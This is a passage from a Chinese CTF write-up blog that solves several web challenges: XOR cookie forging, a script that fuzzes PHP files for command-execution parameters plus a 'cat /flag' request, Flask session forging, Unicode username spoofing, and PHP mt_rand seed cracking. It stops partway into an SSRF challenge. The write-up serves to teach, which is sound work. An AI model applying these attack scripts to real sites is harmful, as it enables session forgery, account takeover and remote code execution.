print(cookie_new)</span><br></pre></td></tr></table></figure><p>运行脚本得到16个base64加密后的值</p><p>按理说原题利用bp是可以爆破的出来的，但是这个题目不知道是环境的问题还是什么原因，后端的user值一直在变，意思是说<code>rnd</code>值一直在变，那md5加密后的<code>key</code>值也会变，脚本就毫无意义，所以无果，还是我哪里理解错了。。。。。先放这里，等我啥时候想明白了，或者哪位大佬告诉我原因了再补上。</p><p>我来填坑了，上面一步我还是理解错了，刷新界面就算会再次执行php脚本，但也会在比较完<code>$username</code>的值后再进入else函数再执行一遍<code>encrypt</code>函数回显一个新的<code>cookie</code>，所以不用考虑<code>user</code>的值会变的问题，因为在他变之前如果我们已经判断出<code>$username</code>==<code>system</code>了，就会成功拿到flag，而后台不会再调用<code>encrypt</code>函数生成新的<code>user</code>，所以这里是没有问题的，但是爆破的时候还是爆破不出来，为什么呢？我可是怀疑我的python脚本</p><p>在网上找个php脚本来执行一下看看二者得出来的base64有什么区别</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $txt1 = <span class="string">'guest'</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($txt1); $i++) &#123;</span><br><span class="line">        $txt1[$i] = chr(ord($txt1[$i])+<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $cookie_guest = <span class="string">'emVTQkZHCh8d'</span>; </span><br><span class="line">    $cookie_guest = base64_decode($cookie_guest);</span><br><span class="line">    $rnd = substr($cookie_guest,<span class="number">0</span>,<span class="number">4</span>); </span><br><span class="line">    $ttmp = substr($cookie_guest,<span class="number">4</span>);</span><br><span class="line">    $key=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($txt1); $i++) &#123;</span><br><span class="line">        $key .= ($txt1[$i] ^ $ttmp[$i]);<span class="comment">//$key=md5($rnd.$key);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $txt2 = <span class="string">'system'</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($txt2); $i++) &#123;</span><br><span class="line">        $txt2[$i] = chr(ord($txt2[$i])+<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $md5 = <span class="string">'0123456789abcdef'</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($md5); $i++) &#123;</span><br><span class="line">        $key_new = $key.$md5[$i];</span><br><span class="line">        $cookie_system=<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($txt2); $j++) &#123;</span><br><span class="line">            $cookie_system .= ($key_new[$j] ^ $txt2[$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        $cookie_system = base64_encode($rnd.$cookie_system);</span><br><span class="line">        <span class="keyword">echo</span> $cookie_system.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220160920767.png" alt=""></p><p>发现预期结果和我想的并不一样，但是结果却有几分相似，逐步排查后发现到最后一步我得到的key的6位值和php上的是一样的，但结果经过base64编码后就不一样了，应该是编码的问题，在网上查了一番后发现python3默认把脚本文件用<code>utf-8</code>进行编码，python2用的是<code>ascii</code>（我用的是python3，python2不会出现这种情况），而php对base64编码的函数是好像用的ascii进行编码（应该~，后文验证），于是改用脚本base64编码方式，这里使用<code>Latin1</code>进行编码，<strong>Latin1编码是单字节编码，向下兼容ASCII，</strong>其编码范围是0x00-0xFF，0x00-0x7F之间完全和ASCII一致，0x80-0x9F之间是控制字符，0xA0-0xFF之间是文字符号，<a href="https://blog.csdn.net/BLGT_57/article/details/80848492" target="_blank" rel="noopener">详</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">session = <span class="string">'QlRxaRVPCx5K'</span></span><br><span class="line">txt = str(base64.b64decode(session),<span class="string">"Latin1"</span>)</span><br><span class="line">rnd = txt[<span class="number">0</span>:<span class="number">4</span>]   <span class="comment">#拿到rnd的值</span></span><br><span class="line">ttemp = txt[<span class="number">4</span>:]</span><br><span class="line">guest = <span class="string">'guest'</span></span><br><span class="line">tmp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(guest)):</span><br><span class="line">    tmp += chr(ord(guest[i]) + <span class="number">10</span>)</span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ttemp)):</span><br><span class="line">    key += chr(ord(tmp[i]) ^ ord(ttemp[i]))<span class="comment">#拿到key</span></span><br><span class="line">system = <span class="string">'system'</span></span><br><span class="line">system1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(system)):</span><br><span class="line">    system1 += chr(ord(system[i]) + <span class="number">10</span>)</span><br><span class="line">md5 = <span class="string">'0123456789abcdef'</span></span><br><span class="line">key_new = <span class="string">''</span></span><br><span class="line">cookie_new = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(md5)):</span><br><span class="line">    key_new  = key + md5[i]</span><br><span class="line">    session_new = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(system1)):</span><br><span class="line">        session_new += chr(ord(key_new[j]) ^ ord(system1[j]))</span><br><span class="line">    session_new = rnd + session_new</span><br><span class="line">    cookie_new = str(base64.b64encode(session_new.encode(<span class="string">'Latin1'</span>)),<span class="string">'Latin1'</span>)</span><br><span class="line">    print(cookie_new)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220162317195.png" alt=""></p><p>于是得到的值和php编码出来的完全一致，然后拿到bp中进行爆破拿到flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220162440443.png" alt=""></p><p>写脚本的水平实在是太菜了，还得多练才行</p><h2 id="2019强网杯—高明的黑客"><a href="#2019强网杯—高明的黑客" class="headerlink" title="2019强网杯—高明的黑客"></a>2019强网杯—高明的黑客</h2><p>核心————————–python脚本</p><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-190.png" alt=""></p><p>将源码下载下来解压后发现有3000多个php文件，于是上大佬脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">'开始时间：  '</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  <span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r"C:/Users/71071/Desktop/src/"</span></span><br><span class="line">os.chdir(filePath)    <span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span><span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span><span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span><span class="params">(file)</span>:</span></span><br><span class="line">    s1.acquire()</span><br><span class="line">    print(<span class="string">'trying   '</span>+file+ <span class="string">'     '</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> open(file,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:    <span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = list(re.findall(<span class="string">'\$_GET\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">            posts = list(re.findall(<span class="string">'\$_POST\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    url = <span class="string">'http://1d941413-1227-4486-890d-581a1eda8638.node3.buuoj.cn/'</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">'?%s='</span>%a+<span class="string">"echo 'xxxxxx';"</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">"echo 'xxxxxx';"</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:                   <span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">'找到了利用文件： '</span>+file+<span class="string">"  and 找到了利用的参数：%s"</span> %param)</span><br><span class="line">        print(<span class="string">'结束时间：  '</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-191.png" alt=""></p><p>访问xk0SzyKwfzw.php?Efa5BVG=cat /flag即可得到flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-192.png" alt=""></p><h2 id="2018HCTF—admin"><a href="#2018HCTF—admin" class="headerlink" title="2018HCTF—admin"></a>2018HCTF—admin</h2><p>核心------------------------ ①flask session 伪造 ；②unicode欺骗 ，<a href="https://www.codercto.com/a/38179.html" target="_blank" rel="noopener">参考</a></p><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-183.png" alt=""></p><h3 id="Flask-session-伪造"><a href="#Flask-session-伪造" class="headerlink" title="Flask session 伪造"></a>Flask session 伪造</h3><p>参考文章：</p><ul><li><a href="https://xz.aliyun.com/t/3569" target="_blank" rel="noopener">Python Web之flask session&amp;格式化字符串漏洞</a></li><li><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html#" target="_blank" rel="noopener">客户端 session 导致的安全问题</a></li></ul><p>在index和change界面的源码处分别有两处提示：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-184.png" alt=""></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-185.png" alt=""></p><p>可知需要用户为admin才可以拿到flag，下载下来后发现web框架是用<a href="https://baike.baidu.com/item/Flask/1241509?fr=aladdin" target="_blank" rel="noopener">flask</a>写的</p><p>解题具体操作如下：</p><p>先注册一个账户：admin1</p><p>在index界面拿到自己的session，进行解码，上大佬脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-187.png" alt=""></p><p>在index.html发现只要session[‘name’]==’admin’即可作为admin用户登录，再将解码出来的session中的name改为admin再进行一次编码来伪造admin的session，对session编码需要SECRET_KEY，在config.py处找到，此处用脚本编码，<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">脚本git下载地址</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-188.png" alt=""></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-186.png" alt=""></p><p>将自己的session修改为编码后的session即可得到flag</p><h3 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h3><p>当解题思路断了的时候，不妨结合代码角度思考，前面在改密码界面就感觉到不对，因为密码就直接改不需要验证什么的，于是找到改密码的change函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/change', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = strlower(session[<span class="string">'name'</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">'change successful'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'change.html'</span>, title = <span class="string">'change'</span>, form = form)</span><br></pre></td></tr></table></figure><p>经大佬文章提点，发现在进行改密的时候使用了strlower函数将用户名转成了小写，一般在python中转小写用的都是lower函数，于是跟进strlower函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>研究nodeprep.prepare函数，nodeprep是从Twisted模块导入的，在requirements.txt文件中看到Twisted版本与最新版本相差甚远，存在猫腻，<a href="https://panda1g1.github.io/2018/11/15/HCTF%20admin/" target="_blank" rel="noopener">参考</a></p><p>于是就有了以下的Unicode编码问题；具体编码方式：<a href="https://unicode-table.com/cn/search/?q=%E4%BF%AE%E9%A5%B0%E5%AD%97%E6%AF%8D%E5%A4%A7%E5%86%99" target="_blank" rel="noopener">修饰字母大写</a></p><p>nodeprep.prepare会进行如下操作</p><p>ᴬ-&gt;A-&gt;a;ᴬdmin-&gt;Admin-&gt;admin</p><p>参考：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/ba81f7598149fdce96a3ad74e3ab6ff1.png" alt=""></p><p>注册 ᴬdmin ；登录 ᴬdmin ，经过一次strlower变成Admin，修改密码时name又经过一次strlower更改了admin的密码，随后即可以修改后的密码登录拿到flag</p><h2 id="安恒杯-新春祈福赛—枯燥的抽奖"><a href="#安恒杯-新春祈福赛—枯燥的抽奖" class="headerlink" title="安恒杯-新春祈福赛—枯燥的抽奖"></a>安恒杯-新春祈福赛—枯燥的抽奖</h2><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202200452558.png" alt=""></p><p>F12发现check.php，访问得到php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure><p>发现mt_srand()和mt_rand() 并且session是用随机数设置的</p><p>上爆破工具php_mt_seed和脚本得到随机数种子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'cTVM5ZeUkl'</span></span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 2 0 61 55 55 0 61 57 57 0 61 48 48 0 61 31 31 0 61 61 61 0 61 4 4 0 61 56 56 0 61 10 10 0 61 11 11 0 61</span><br></pre></td></tr></table></figure><p>爆破</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202201906349.png" alt=""></p><p>将得到的随机种子放到php脚本中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">654818272</span>);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到字符串</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202202206918.png" alt=""></p><h2 id="De1CTF-2019—SSRF-Me"><a href="#De1CTF-2019—SSRF-Me" class="headerlink" title="De1CTF-2019—SSRF Me"></a>De1CTF-2019—SSRF Me</h2><p>点开链接得到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 